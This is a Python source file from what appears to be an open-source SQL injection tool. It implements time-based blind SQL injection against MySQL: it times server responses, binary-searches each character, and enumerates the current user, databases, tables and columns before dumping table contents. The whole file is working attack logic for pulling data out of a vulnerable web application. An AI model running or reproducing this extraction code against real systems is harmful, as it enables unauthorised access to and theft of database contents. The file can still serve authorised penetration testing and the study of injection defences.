#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2019/7/21


from lib.core.dbs.databases import Databases
from lib.core.common import format_data, match_data, match_all_data,random_str,format_hex,find_success,tamper,stdev,average
from lib.core.request.connection import req
from lib.core.data import conf,logger
from lib.parse.payload import SQL,BOUNDARY,SEP_CHAR
# req = Request(headers,conf.proxies,conf.timeout,method='get')


class Mysql(Databases):
    def __init__(self,tech):
        Databases.__init__(self,tech)

    def get_value_from_response(self,text,token):
        res = ""
        res = match_data(text,token)
        return res

    def get_value_by_blind(self, table_name, col_name, in_limit='0'):
        len = self.get_length(table_name, col_name, in_limit)
        text = ""
        for i in range(1, len + 1):
            value = self.double_search(table_name, col_name, in_limit, str(i), left_number=0,
                                       right_number=256)
            text = text + chr(value)
            logger.success(text)
        return text

    def is_delay(self,url,payload):
        is_delay = False
        req.connection(url,"")
        t1 = req.get_elapsed_time()
        req.connection(url, "")
        t2 = req.get_elapsed_time()
        req.connection(url, "")
        t3 = req.get_elapsed_time()
        t = [t1,t2,t3]
        deviation = stdev(t)
        lower_std_limit = average(t) + 7* deviation
        req.connection(url,payload)
        t4 = req.get_elapsed_time()
        value = (t4 >= max(0.5,lower_std_limit))
        is_delay = value
        return is_delay


    def double_search(self, table_name, col_name, in_limit='0', index="", left_number=0, right_number=96):
        is_ture = False
        while True:
            payload, ss = self.get_payload(table_name, col_name, in_limit, index, value=str(right_number))
            url = conf.url
            try:
                is_ture = self.is_delay(url,payload)
            except Exception as e:
                break
            if is_ture:
                left_number = right_number
                right_number = 2 * right_number
                is_ture = False
            else:
                break
        is_ture = False
        while left_number < right_number:
            mid = int((left_number + right_number) / 2)
            payload, ss = self.get_payload(table_name, col_name, in_limit, index, value=str(mid))
            try:
                url = conf.url
                is_ture = self.is_delay(url, payload)
            except Exception,e:
                break
            if is_ture:
                left_number = mid
            else:
                right_number = mid
            is_ture = False
            if left_number == right_number - 1:
                payload, ss = self.get_payload(table_name, col_name, in_limit, index, value=str(mid))
                url = conf.url
                try:
                    is_ture = self.is_delay(url, payload)
                except Exception, e:
                    break
                if is_ture:
                    mid += 1
                    break
                else:
                    break
        return mid

    def get_payload(self,table_name,col_name,i="0",index="1",value=""): # (index,vaule) is used blind
        cols = []
        token = ""
        for col in col_name:
            cols.append(col)
        cat_str = cols[0]
        boundary = SEP_CHAR + self.boundary.replace('%value',value).replace('%index',index)
        query = self.query.replace('t_n',table_name).replace('%s', cat_str).replace('%d', i)
        boundary,query = tamper(boundary,query)
        payload = boundary
        payload = payload.replace('%query',query)
        payload = format_data(payload)
        if conf.debug:
            logger.success(payload)
        return payload,token

    def get_length(self,table_name,col_name,i="0"): # limit i
        self.set_boundary(BOUNDARY.time_length)
        len_index = self.double_search(table_name, col_name,i, "", left_number=0, right_number=10)
        self.reset_boundary()
        logger.info("value len is:" + str(len_index))
        return len_index

    def get_counts(self,table_name,col_name,i="0"):
        col_name = ["count(*)"]
        counts = ''
        self.set_boundary(BOUNDARY.time_count)
        counts =  self.double_search(table_name, col_name, i, "", left_number=0, right_number=10)
        self.reset_boundary()
        logger.info("CountsEnties:" + str(counts))
        return counts

    def get_current_user(self):
        table_name = 'information_schema.schemata'
        col_name = ["user()"]
        user = self.get_value_by_blind(table_name,col_name,'0')
        logger.info("CurrentUser:" + user)
        return user

    def get_current_db(self):
        table_name = 'information_schema.schemata'
        col_name = ["database()"]
        database = ""
        database = self.get_value_by_blind(table_name,col_name,'0')
        logger.info("CurrentBase:" + database)
        return database

    def get_dbs(self):
        table_name = 'information_schema.schemata'
        col_name = ["schema_name"]
        counts = self.get_counts(table_name,col_name)
        logger.info("all dbs counts is :%s" % counts)
        dbs = []
        for i in range(int(counts)):
            db = self.get_value_by_blind(table_name,col_name,str(i))
            dbs.append(db)
            logger.info("Ent:" + db)
        return dbs

    def get_tables(self,db):
        table_name = 'information_schema.tables'
        col_name = ["table_name"]
        query = SQL.query_tab.replace("{db}", format_hex(db))
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        logger.info("all tables counts is :%s" % counts)
        tables = []
        for i in range(int(counts)):
            table = self.get_value_by_blind(table_name,col_name,str(i))
            tables.append(table)
            logger.info("Ent:" + table)
        return tables

    def get_columns(self,db,table):
        table_name = 'information_schema.columns'
        col_name = ["column_name"]
        query = SQL.query_col.replace("{db}",format_hex(db)).replace("{table}",format_hex(table))
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        columns = []
        for i in range(int(counts)):
            col = self.get_value_by_blind(table_name,col_name,str(i))
            columns.append(col)
            logger.info("Ent:" + col)
        return columns

    def dump(self,db,table,col):
        table_name = '{0}.{1}'.format(db,table)
        col_name = ["{0}".format(col)]
        self.reset_query()
        counts = self.get_counts(table_name, col_name)
        data = []
        for i in range(int(counts)):
            value = self.get_value_by_blind(table_name,col_name,str(i))
            logger.info("Ent:{0}.{1}:{2}".format(table_name,col_name,value))
            data.append(value)
        return data
